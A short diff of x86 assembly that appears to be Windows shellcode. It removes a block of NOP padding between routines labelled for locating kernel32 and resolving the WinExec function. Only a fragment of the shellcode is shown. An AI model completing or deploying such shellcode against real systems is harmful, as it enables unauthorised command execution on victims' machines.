@@ -44,15 +44,6 @@ locate_kernel32:
     nop                             ;
     jmp 0x3f                        ;
 
-debug_block:
-    nop                            ;
-    nop                             ;
-    nop                             ;
-    nop                             ;
-    nop                             ;
-    nop                             ;
-    jmp 0x14                        ;
-
 ; r15 = base address of kernel32
 resolve_winexec:
     mov ebx, 0x1280                 ; mov the offset of WinExec in to ebx
